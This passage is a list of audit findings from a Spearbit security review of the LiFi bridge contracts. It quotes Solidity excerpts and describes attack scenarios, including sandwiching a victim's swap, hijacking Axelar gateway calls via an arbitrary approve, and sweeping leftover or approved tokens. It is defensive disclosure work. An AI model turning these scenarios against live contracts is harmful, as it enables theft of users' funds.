        "title": "Tokens are left in the protocol when the swap at the destination chain fails",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "LiFi protocol finds the best bridge route for users. In some cases, it helps users do a swap at the destination chain. With the help of the bridge protocols, LiFi protocol helps users trigger swapAndComplete- BridgeTokensVia{Services} or CompleteBridgeTokensVia{Services} at the destination chain to do the swap. Some bridge services will send the tokens directly to the receiver address when the execution fails. For example, Stargate, Amarok and NXTP do the external call in a try-catch clause and send the tokens directly to the receiver If the receiver is the Executor contract, when it fails. The tokens will stay in the LiFi protocols in this scenario. users can freely pull the tokens. Note: Exploiters can pull the tokens from LiFi protocol, Please refer to the issue Remaining tokens can be sweeped from the LiFi Diamond or the Executor , Issue #82 Exploiters can take a more aggressive strategy and force the victims swap to revert. A possible exploit scenario:  A victim wants to swap 10K optimisms BTC into Ethereum mainnet USDC.  Since dexs on mainnet have the best liquidity, LiFi protocol helps users to the swap on mainnet  The transaction on the source chain (optimism) suceed and the Bridge services try to call Complete- BridgeTokensVia{Services} on mainnet.  The exploiter builds a sandwich attack to pump the BTC price. The CompleteBridgeTokens fails since the price is bad.  The bridge service does not revert the whole transaction. Instead, it sends the BTC on the mainnet to the receiver (LiFi protocol).  The exploiter pulls tokens from the LiFi protocol.",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Tokens transferred with Axelar can get lost if the destination transaction cant be executed",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "If _executeWithToken() reverts then the transaction can be retried, possibly with additional gas. See axelar recovery. However there is no option to return the tokens or send them elsewhere. This means that tokens would be lost if the call cannot be made to work. contract Executor is IAxelarExecutable, Ownable, ReentrancyGuard, ILiFi { function _executeWithToken(...) ... { ... (bool success, ) = callTo.call(callData); if (!success) revert ExecutionFailed(); } }",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Use the getStorage() / NAMESPACE pattern instead of global variables",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "The facet DexManagerFacet and the inherited contracts Swapper.sol / SwapperV2.sol define a global variable appStorage on the first storage slot. These two overlap, which in this case is intentional. However it is dangerous to use this construction in a Diamond contract as this uses delegatecall. If any other contract uses a global variable it will overlap with appStorage with unpredictable results. This is especially impor- tant because it involves access control. For example if the contract IAxelarExecutable.sol were to be inherited in a facet, then its global variable gateway would overlap. Luckily this is currently not the case. contract DexManagerFacet { ... LibStorage internal appStorage; ... } contract Swapper is ILiFi { ... LibStorage internal appStorage; // overlaps with DexManagerFacet which is intentional ... }",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Decrease allowance when it is already set a non-zero value",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "Non-standard tokens like USDT will revert the transaction when a contract or a user tries to approve an allowance when the spender allowance is already set to a non zero value. For that reason, the previous allowance should be decreased before increasing allowance in the related function.  Performing a direct overwrite of the value in the allowances mapping is susceptible to front-running scenarios by an attacker (e.g., an approved spender). As an Openzeppelin mentioned, safeApprove should only be called when setting an initial allowance or when resetting it to zero. 9 function safeApprove( IERC20 token, address spender, uint256 value ) internal { // safeApprove should only be called when setting an initial allowance, // or when resetting it to zero. To increase and decrease it, use // 'safeIncreaseAllowance' and 'safeDecreaseAllowance' require( (value == 0) || (token.allowance(address(this), spender) == 0), \"SafeERC20: approve from non-zero to non-zero allowance\" ); _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value)); } There are four instance of this issue:  AxelarFacet.sol is directly using approve function which does not check return value of an external function. The faucet should utilize LibAsset.maxApproveERC20() function like the other faucets.  LibAsset s LibAsset.maxApproveERC20() function is used on the other faucets. For instance, USDTs ap- proval mechanism reverts if current allowance is nonzero. From that reason, the function can approve with zero first or safeIncreaseAllowance can be utilized.  FusePoolZap.sol is also using approve function which does not check return value . The contract does not import any other libraries, that being the case, the contract should use safeApprove function with approving zero.  Executor.sol is directly using approve function which does not check return value of an external function. The contract should utilize LibAsset.maxApproveERC20() function like the other contracts.",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Too generic calls in GenericBridgeFacet allow stealing of tokens",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "With the contract GenericBridgeFacet, the functions swapAndStartBridgeTokensGeneric() (via LibSwap.swap()) and _startBridge() allow arbitrary functions calls, which allow anyone to call transferFrom() and steal tokens from anyone who has given a large allowance to the LiFi protocol. This has been used to hack LiFi in the past. The followings risks also are present:  call the Lifi Diamand itself via functions that dont have nonReentrant.  perhaps cancel transfers of other users.  call functions that are protected by a check on this, like completeBridgeTokensViaStargate. 10 contract GenericBridgeFacet is ILiFi, ReentrancyGuard { function swapAndStartBridgeTokensGeneric( ... LibSwap.swap(_lifiData.transactionId, _swapData[i]); ... } function _startBridge(BridgeData memory _bridgeData) internal { ... (bool success, bytes memory res) = _bridgeData.callTo.call{ value: value ,! }(_bridgeData.callData); ... } } library LibSwap { function swap(bytes32 transactionId, SwapData calldata _swapData) internal { ... (bool success, bytes memory res) = _swapData.callTo.call{ value: nativeValue ,! }(_swapData.callData); ... } }",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: High Risk"
        ]
    },
    {
        "title": "LiFi protocol isnt hardened",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "The usage of the LiFi protocol depends largely on off chain APIs. It takes all values, fees, limits, chain ids and addresses to be called from the APIs and doesnt verify them. Several elements are not connected via smart contracts but via the API, for example:  the emits of LiFiTransferStarted versus the bridge transactions.  the fees paid to the FeeCollector versus the bridge transactions.  the Periphery contracts as defined in the PeripheryRegistryFacet versus the rest. In case the API and or frontend contain errors or are hacked then tokens could be easily lost. Also, when calling the LiFi contracts directly or via other smart contracts, it is rather trivial to commit mistakes and loose tokens. Emit data can be easily disturbed by malicious actors, making it unusable. The payment of fees can be easily circumvented by accessing the contracts directly. It is easy to make fake websites which trick users into signing transactions which seem to be for LiFi but result in loosing tokens. With the current design, the power of smart contracts isnt used and it introduces numerous risks as described in the rest of this report.",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Bridge with Axelar can be stolen with malicious external call",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "Executor contract allows users to build an arbitrary payload external call to any address except address(erc20Proxy). erc20Proxy is not the only dangerous address to call. By building a malicious external call to Axelar gateway, exploiters can steal users funds. The Executor does swaps at the destination chain. By setting the receiver address to the Executor contract at the destination chain, Li-Fi can help users to get the best price. Executor inherits IAxelarExecutable. execute and executeWithToken validates the payload and executes the external call. IAxelarExecutable.sol#L27-L40 function executeWithToken( bytes32 commandId, string calldata sourceChain, string calldata sourceAddress, bytes calldata payload, string calldata tokenSymbol, uint256 amount ) external { bytes32 payloadHash = keccak256(payload); if (!gateway.validateContractCallAndMint(commandId, sourceChain, sourceAddress, payloadHash, ,! tokenSymbol, amount)) revert NotApprovedByGateway(); _executeWithToken(sourceChain, sourceAddress, payload, tokenSymbol, amount); } The nuance lies in the Axelar gateway AxelarGateway.sol#L133-L148. Once the receiver calls validateContract- CallAndMint with a valid payload, the gateway mints the tokens to the receiver and marks it as executed. It is the receiver contracts responsibility to execute the external call. Exploiters can build a malicious external call to trigger validateContractCallAndMint, the Axelar gateway would mint the tokens to the Executor contract. The exploiter can then pull the tokens from the Executor contract. The possible exploit scenario 1. Exploiter build a malicious external call. token.approve(address(exploiter), type(uint256).max) 2. A victim user uses the AxelarFacet to bridge tokens. Since the destination bridge has the best price, the users set the receiver to address(Executor) and finish the swap with this.swapAndCompleteBridgeTokens 3. Exploiter observes the victims bridge tx and way.validateContractCallAndMint. exploiter can pull the minted token from the executor contract since theres max allowance. The executor the minted token. builds an contract gets external call to trigger gate- The 4. The victim calls Executor.execute() with the valid payload. However, since the payload has been triggered by the exploiter, its no longer valid. 12",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: High Risk"
        ]
    },
    {
        "title": "LibSwap may pull tokens that are different from the specified asset",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "LibSwap.swap is responsible for doing swaps. Its designed to swap one asset at a time. The _- swapData.callData is provided by user and the LiFi protocol only checks its signature. As a result, users can build a calldata to swap a different asset as specified. For example, the users can set fromAssetId = dai provided addLiquidity(usdc, dai, ...) as call data. The uniswap router would pull usdc and dai at the same time. If there were remaining tokens left in the LiFi protocol, users can sweep tokens from the protocol. library LibSwap { function swap(bytes32 transactionId, SwapData calldata _swapData) internal { ... if (!LibAsset.isNativeAsset(fromAssetId)) { LibAsset.maxApproveERC20(IERC20(fromAssetId), _swapData.approveTo, fromAmount); if (toDeposit != 0) { LibAsset.transferFromERC20(fromAssetId, msg.sender, address(this), toDeposit); } } else { nativeValue = fromAmount; } // solhint-disable-next-line avoid-low-level-calls (bool success, bytes memory res) = _swapData.callTo.call{ value: nativeValue ,! }(_swapData.callData); if (!success) { string memory reason = LibUtil.getRevertMsg(res); revert(reason); } }",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Check slippage of swaps",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "Several bridges check that the output of swaps isnt 0. However it could also happen that swap give a positive output, but still lower than expected due to slippage / sandwiching / MEV. Several AMMs will have a mechanism to limit slippage, but it might be useful to add a generic mechanism as multiple swaps in sequence might have a relative large slippage. function swapAndStartBridgeTokensViaOmniBridge(...) ... { ... uint256 amount = _executeAndCheckSwaps(_lifiData, _swapData, payable(msg.sender)); if (amount == 0) { revert InvalidAmount(); } _startBridge(_lifiData, _bridgeData, amount, true); }",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Replace createRetryableTicketNoRefundAliasRewrite() with depositEth()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "The function _startBridge() of the ArbitrumBridgeFacet uses createRetryableTicketNoRefun- dAliasRewrite(). According to the docs: address-aliasing, this method skips some address rewrite magic that depositEth() does. Normally depositEth() should be used, according to the docs depositing-and-withdrawing-ether. Also this method will be deprecated after nitro: Inbox.sol#L283-L297. While the bridge doesnt do these checks of depositEth(), it is easy for developers, that call the LiFi contracts directly, to make mistakes and loose tokens. function _startBridge(...) ... { ... if (LibAsset.isNativeAsset(_bridgeData.assetId)) { gatewayRouter.createRetryableTicketNoRefundAliasRewrite{ value: _amount + cost }(...); } ... ... }",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Hardcode or whitelist the Axelar destinationAddress",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "The functions executeCallViaAxelar() and executeCallWithTokenViaAxelar() call a destina- tionAddress on the destinationChain. This destinationAddress needs to have specific Axelar functions (_ex- ecute() and _executeWithTokento() ) be able to receive the calls. This is implemented in the Executor. If these functions dont exist at the destinationAddress, the transferred tokens will be lost. /// @param destinationAddress the address of the LiFi contract on the destinationChain function executeCallViaAxelar(..., string memory destinationAddress, ...) ... { ... s.gateway.callContract(destinationChain, destinationAddress, payload); } Note: the comment \"the address of the LiFi contract\" isnt clear, it could either be the LiFi Diamond or the Execu- tor.",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "WormholeFacet doesnt send native token",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "The functions of WormholeFacet allow sending the native token, however they dont actually send it across the bridge, causing the native token to stay stuck in the LiFi Diamond and get lost for the sender. contract WormholeFacet is ILiFi, ReentrancyGuard, Swapper { function startBridgeTokensViaWormhole(... ) ... payable ... { // is payable LibAsset.depositAsset(_wormholeData.token, _wormholeData.amount); // allows native token _startBridge(_wormholeData); ... } function _startBridge(WormholeData memory _wormholeData) private { ... LibAsset.maxApproveERC20(...); // geared towards ERC20, also works when `msg.value` is set // no { value : .... } IWormholeRouter(_wormholeData.wormholeRouter).transferTokens(...); } }",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "ArbitrumBridgeFacet does not check if msg.value is enough to cover the cost",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "The ArbitrumBridgeFacet does not check whether the users provided ether (msg.value) is enough to cover _amount + cost. If there are remaining ethers in LiFis LibDiamond address, exploiters can set a large cost and sweep the ether. function _startBridge( ... ) private { ... uint256 cost = _bridgeData.maxSubmissionCost + _bridgeData.maxGas * _bridgeData.maxGasPrice; if (LibAsset.isNativeAsset(_bridgeData.assetId)) { gatewayRouter.createRetryableTicketNoRefundAliasRewrite{ value: _amount + cost }( ... ); } else { gatewayRouter.outboundTransfer{ value: cost }( ... ); }",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Underpaying Optimism l2gas may lead to loss of funds",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "The OptimismBridgeFacet uses Optimisms bridge with user-provided l2gas. function _startBridge( LiFiData calldata _lifiData, BridgeData calldata _bridgeData, uint256 _amount, bool _hasSourceSwap ) private { ... if (LibAsset.isNativeAsset(_bridgeData.assetId)) { bridge.depositETHTo{ value: _amount }(_bridgeData.receiver, _bridgeData.l2Gas, \"\"); } else { ... bridge.depositERC20To( _bridgeData.assetId, _bridgeData.assetIdOnL2, _bridgeData.receiver, _amount, _bridgeData.l2Gas, \"\" ); } } Optimisms standard token bridge makes the cross-chain deposit by sending a cross-chain message to L2Bridge. L1StandardBridge.sol#L114-L123 17 // Construct calldata for finalizeDeposit call bytes memory message = abi.encodeWithSelector( IL2ERC20Bridge.finalizeDeposit.selector, address(0), Lib_PredeployAddresses.OVM_ETH, _from, _to, msg.value, _data ); // Send calldata into L2 // slither-disable-next-line reentrancy-events sendCrossDomainMessage(l2TokenBridge, _l2Gas, message); If the l2Gas is underpaid, finalizeDeposit will fail and user funds will be lost.",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Funds can be locked during the recovery stage",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "The recovery is an address that should receive funds if the execution fails on destination do- main. This ensures that funds are never lost with failed calls. However, in the AmarokFacet It is hardcoded as msg.sender. Several unexpected behaviour can be observed with this implementation.  If the msg.sender is a smart contract, It might not be available on the destination chain.  If the msg.sender is a smart contract and deployed on the other chain, the contract maybe will not have function to withdraw native token. As a result of this implementation, funds can be locked when an execution fails. 18 contract AmarokFacet is ILiFi, SwapperV2, ReentrancyGuard { ... IConnextHandler.XCallArgs memory xcallArgs = IConnextHandler.XCallArgs({ params: IConnextHandler.CallParams({ to: _bridgeData.receiver, callData: _bridgeData.callData, originDomain: _bridgeData.srcChainDomain, destinationDomain: _bridgeData.dstChainDomain, agent: _bridgeData.receiver, recovery: msg.sender, forceSlow: false, receiveLocal: false, callback: address(0), callbackFee: 0, relayerFee: 0, slippageTol: _bridgeData.slippageTol }), transactingAssetId: _bridgeData.assetId, amount: _amount }); ... }",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "What if the receiver of Axelar _executeWithToken() doesnt claim all tokens",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "The function _executeWithToken() approves tokens and then calls callTo. If that contract doesnt retrieve the tokens then the tokens stay within the Executor and are lost. Also see: \"Remaining tokens can be sweeped from the LiFi Diamond or the Executor\" contract Executor is IAxelarExecutable, Ownable, ReentrancyGuard, ILiFi { function _executeWithToken(...) ... { ... // transfer received tokens to the recipient IERC20(tokenAddress).approve(callTo, amount); (bool success, ) = callTo.call(callData); ... } }",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Remaining tokens can be sweeped from the LiFi Diamond or the Executor",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "The initial balance of (native) tokens in both the Lifi Diamond and the Executor contract can be sweeped by all the swap functions in all the bridges, which use the following functions:  swapAndCompleteBridgeTokensViaStargate() of Executor.sol  swapAndCompleteBridgeTokens() of Executor.sol  swapAndExecute() of Executor.sol  _executeAndCheckSwaps() of SwapperV2.sol  _executeAndCheckSwaps() of Swapper.sol  swapAndCompleteBridgeTokens() of XChainExecFacet Although these functions ...  swapAndCompleteBridgeTokensViaStargate() of Executor.sol  swapAndCompleteBridgeTokens() of Executor.sol  swapAndExecute() of Executor.sol  swapAndCompleteBridgeTokens() of XChainExecFacet have the following code: if (!LibAsset.isNativeAsset(transferredAssetId)) { startingBalance = LibAsset.getOwnBalance(transferredAssetId); // sometimes transfer tokens in } else { startingBalance = LibAsset.getOwnBalance(transferredAssetId) - msg.value; } // do swaps uint256 postSwapBalance = LibAsset.getOwnBalance(transferredAssetId); if (postSwapBalance > startingBalance) { LibAsset.transferAsset(transferredAssetId, receiver, postSwapBalance - startingBalance); } This doesnt protect the initial balance of the first tokens, because it can just be part of a swap to another token. The initial balances of intermediate tokens are not checked or protected. As there normally shouldnt be (native) tokens in the LiFi Diamond or the Executor the risk is limited. Note: set the risk to medium as there are other issues in this report that leave tokens in the contracts Although in practice there is some dust in the LiFi Diamond and the Executor:  0x362fa9d0bca5d19f743db50738345ce2b40ec99f  0x46405a9f361c1b9fc09f2c83714f806ff249dae7",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Wormhole bridge chain IDs are different than EVM chain IDs",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "According to documentation, Wormhole uses different chain ids than EVM based chain ids. However, the code is implemented with block.chainid check. LiFi is integrated with third party platforms through API. The API/UI side can implement chain id checks, but direct interaction with the contract can lead to loss of funds. function _startBridge(WormholeData memory _wormholeData) private { if (block.chainid == _wormholeData.toChainId) revert CannotBridgeToSameNetwork(); } From other perspective, the following line limits the recipient address to an EVM address. done to a non EVM chain (e.g. Solana, Terra, Terra classic), then the tokens would be lost. If a bridge would be ... bytes32(uint256(uint160(_wormholeData.recipient))) ... Example transactions below.  Chainid 1 Solana  Chainid 3 Terra Classic On the other hand, the usage of the LiFi protocol depends largely on off chain APIs. It takes all values, fees, limits, chain ids and addresses to be called from the APIs. As previously mentioned, the wormhole destination chain ids are different than standard EVM based chains, the following event can be misinterpreted. ... emit LiFiTransferStarted( _lifiData.transactionId, \"wormhole\", \"\", _lifiData.integrator, _lifiData.referrer, _swapData[0].sendingAssetId, _lifiData.receivingAssetId, _wormholeData.recipient, _swapData[0].fromAmount, _wormholeData.toChainId, // It does not show correct chain id which is expected by LiFi Data Analytics true, false ,! ); ...",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Facets approve arbitrary addresses for ERC20 tokens",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "All the facets pointed above approve an address for an ERC20 token, where both these values are provided by the user: LibAsset.maxApproveERC20(IERC20(token), router, amount); The parameter names change depending on the context. So for any ERC20 token that LifiDiamond contract holds, user can:  call any of the functions in these facets to approve another address for that token.  use the approved address to transfer tokens out of LifiDiamond contract. Note: normally there shouldnt be any tokens in the LiFi Diamond contract so the risk is limited. Note: also see \"Hardcode bridge addresses via immutable\"",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Medium Risk AcrossFacet.sol#L103, ArbitrumBridge-"
        ]
    },
    {
        "title": "FeeCollector not well integrated",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "There is a contract to pay fees for using the bridge: FeeCollector. This is used by crafting a transaction by the frontend API, which then calls the contract via _executeAndCheckSwaps(). Here is an example of the contract Here is an example of the contract of such a transaction Its whitelisted here This way no fees are paid if a developer is using the LiFi contracts directly. Also it is using a mechanism that isnt suited for this. The _executeAndCheckSwaps() is geared for swaps and has several checks on balances. These (and future) checks could interfere with the fee payments. Also this is a complicated and non transparent approach. The project has suggested to see _executeAndCheckSwaps() as a multicall mechanism.",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "_executeSwaps of Executor.sol doesnt have a whitelist",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "The function _executeSwaps() of Executor.sol doesnt have a whitelist, whereas _executeSwaps() of SwapperV2.sol does have a whitelist. Calling arbitrary addresses is dangerous. For example, unlimited al- lowances can be set to allow stealing of leftover tokens in the Executor contract. Luckily, there wouldnt normally be allowances set from users to the Executor.sol so the risk is limited. Note: also see \"Too generic calls in GenericBridgeFacet allow stealing of tokens\" contract Executor is IAxelarExecutable, Ownable, ReentrancyGuard, ILiFi { function _executeSwaps(... ) ... { for (uint256 i = 0; i < _swapData.length; i++) { if (_swapData[i].callTo == address(erc20Proxy)) revert UnAuthorized(); // Prevent calling ,! ERC20 Proxy directly LibSwap.SwapData calldata currentSwapData = _swapData[i]; LibSwap.swap(_lifiData.transactionId, currentSwapData); } } contract SwapperV2 is ILiFi { function _executeSwaps(... ) ... { for (uint256 i = 0; i < _swapData.length; i++) { LibSwap.SwapData calldata currentSwapData = _swapData[i]; if ( !(appStorage.dexAllowlist[currentSwapData.approveTo] && appStorage.dexAllowlist[currentSwapData.callTo] && appStorage.dexFuncSignatureAllowList[bytes32(currentSwapData.callData[:8])]) ) revert ContractCallNotAllowed(); LibSwap.swap(_lifiData.transactionId, currentSwapData); } } Based on the comments of the LiFi project there is also the use case to call more generic contracts, which do not return any token, e.g., NFT buy, carbon offset. It probably better to create new functionality to do this.",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Processing of end balances",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "The contract SwapperV2 has the following construction (twice) to prevent using any already start balance.  it gets a start balance.  does an action.  if the end balance > start balance. then it uses the difference. else (which includes start balance == end balance) it uses the end balance. So if the else clause it reached it uses the end balance and ignores any start balance. If the action hasnt changed the balances then start balance == end balance and this amount is used. When the action has lowered the balances then end balance is also used. This defeats the codes purpose. Note: normally there shouldnt be any tokens in the LiFi Diamond contract so the risk is limited. Note Swapper.sol has similar code. contract SwapperV2 is ILiFi { modifier noLeftovers(LibSwap.SwapData[] calldata _swapData, address payable _receiver) { ... uint256[] memory initialBalances = _fetchBalances(_swapData); ... // all kinds of actions newBalance = LibAsset.getOwnBalance(curAsset); curBalance = newBalance > initialBalances[i] ? newBalance - initialBalances[i] : newBalance; ... } function _executeAndCheckSwaps(...) ... { ... uint256 swapBalance = LibAsset.getOwnBalance(finalTokenId); ... // all kinds of actions uint256 newBalance = LibAsset.getOwnBalance(finalTokenId); swapBalance = newBalance > swapBalance ? newBalance - swapBalance : newBalance; ... }",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Processing of initial balances",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "The LiFi code bases contains two similar source files: Swapper.sol and SwapperV2.sol. One of the differences is the processing of msg.value for native tokens, see pieces of code below. The implementation of SwapperV2.sol sends previously available native token to the msg.sender. The following is exploit example. Assume that:  the LiFi Diamond contract contains 0.1 ETH.  a call is done with msg.value == 1 ETH.  and _swapData[0].fromAmount ETH, which is the amount to be swapped. Option 1Swapper.sol: initialBalances == 1.1 ETH - 1 ETH == 0.1 ETH. Option 2 SwapperV2.sol: initialBalances == 1.1 ETH. After the swap getOwnBalance()is1.1 - 0.5 == 0.6 ETH. Option 1 Swapper.sol: returns 0.6 - 0.1 = 0.5 ETH. Option 2 SwapperV2.sol: returns 0.6 ETH (so includes the previously present ETH). 0.5 == Note: the implementations of noLeftovers() are also different in Swapper.sol and SwapperV2.sol. Note: this is also related to the issue \"Pulling tokens by LibSwap.swap() is counterintuitive\", because the ERC20 are pulled in via LibSwap.swap(), whereas the msg.value is directly added to the balance. As there normally shouldnt be any token in the LiFi Diamond contract the risk is limited. contract Swapper is ILiFi { function _fetchBalances(...) ... { ... for (uint256 i = 0; i < length; i++) { address asset = _swapData[i].receivingAssetId; uint256 balance = LibAsset.getOwnBalance(asset); if (LibAsset.isNativeAsset(asset)) { balances[i] = balance - msg.value; } else { balances[i] = balance; } } return balances; } } contract SwapperV2 is ILiFi { function _fetchBalances(...) ... { ... for (uint256 i = 0; i < length; i++) { balances[i] = LibAsset.getOwnBalance(_swapData[i].receivingAssetId); } ... } } The following functions do a comparable processing of msg.value for the initial balance:  swapAndCompleteBridgeTokensViaStargate() of Executor.sol  swapAndCompleteBridgeTokens() of Executor.sol  swapAndExecute() of Executor.sol  swapAndCompleteBridgeTokens() of XChainExecFacet 25 if (!LibAsset.isNativeAsset(transferredAssetId)) { ... } else { startingBalance = LibAsset.getOwnBalance(transferredAssetId) - msg.value; } However in Executor.sol function swapAndCompleteBridgeTokensViaStargate() isnt optimal for ERC20 tokens because ERC20 tokens are already deposited in the contract before calling this function. function swapAndCompleteBridgeTokensViaStargate(... ) ... { ... if (!LibAsset.isNativeAsset(transferredAssetId)) { startingBalance = LibAsset.getOwnBalance(transferredAssetId); // doesn't correct for initial balance } else { ... } ,! } So assume:  0.1 ETH was in the contract.  1 ETH was added by the bridge.  0.5 ETH is swapped. Then the StartingBalance is calculated to be 0.1 ETH + 1 ETH == 1.1 ETH. So no funds are returned to the receiver as the end balance is 1.1 ETH - 0.5 ETH == 0.6 ETH, is smaller than 1.1 ETH. Whereas this should have been (1.1 ETH - 0.5 ETH) - 0.1 ETH == 0.5 ETH.",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Improve dexAllowlist",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "The functions _executeSwaps() of both SwapperV2.sol and Swapper.sol use a whitelist to make sure the right functions in the allowed dexes are called. The checks for approveTo, callTo and signature (callData) are independent. This means that any signature is valid for any dex combined with any approveTo address. This grands more access than necessary. This is important because multiple functions can have the same signature. For example these two functions have the same signature:  gasprice_bit_ether(int128) 26  transferFrom(address,address,uint256) See bytes4_signature=0x23b872dd Note: brute forcing an innocent looking function is straightforward The transferFrom() is especially dangerous because it allows sweeping tokens from other users that have set an allowance for the LiFi Diamond. If someone gets a dex whitelisted, which contains a function with the same signature then this can be abused in the current code. Present in both SwapperV2.sol and Swapper.sol: function _executeSwaps(...) ... { ... if ( !(appStorage.dexAllowlist[currentSwapData.approveTo] && appStorage.dexAllowlist[currentSwapData.callTo] && appStorage.dexFuncSignatureAllowList[bytes32(currentSwapData.callData[:8])]) ) revert ContractCallNotAllowed(); ... } }",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Pulling tokens by LibSwap.swap() is counterintuitive",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "The function LibSwap.swap() pulls in tokens via transferFromERC20() from msg.sender when needed. When put in a loop, via _executeSwaps(), it can pull in multiple different tokens. It also doesnt detect accidentally sending of native tokens with ERC20 tokens. This approach is counterintuitive and leads to risks. Suppose someone wants to swap 100 USDC to 100 DAI and then 100 DAI to 100 USDT. If the first swap somehow gives back less tokens, for example 90 DAI, then LibSwap.swap() pulls in 10 extra DAI from msg.sender. Note: this requires the msg.sender having given multiple allowances to the LiFi Diamond. Another risk is that an attacker tricks a user to sign a transaction for the LiFi protocol. Within one transaction it can sweep multiple tokens from the user, cleaning out his entire wallet. Note: this requires the msg.sender having given multiple allowances to the LiFi Diamond. In Executor.sol the tokens are already deposited, so the \"pull\" functionality is not needed and can even result in additional issues. In Executor.sol it tries to \"pull\" tokens from \"msg.sender\" itself. In the best case of ERC20 implementations (like OpenZeppeling, Solmate) this has no effect. However some non standard ERC20 imple- mentations might break. 27 contract SwapperV2 is ILiFi { function _executeSwaps(...) ... { ... for (uint256 i = 0; i < _swapData.length; i++) { ... LibSwap.swap(_lifiData.transactionId, currentSwapData); } } } library LibSwap { function swap(...) ... { ... uint256 initialSendingAssetBalance = LibAsset.getOwnBalance(fromAssetId); ... uint256 toDeposit = initialSendingAssetBalance < fromAmount ? fromAmount - ,! initialSendingAssetBalance : 0; ... if (toDeposit != 0) { LibAsset.transferFromERC20(fromAssetId, msg.sender, address(this), toDeposit); } } } Use LibAsset.depositAsset() before doing",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Medium Risk"
        ]
    },
    {
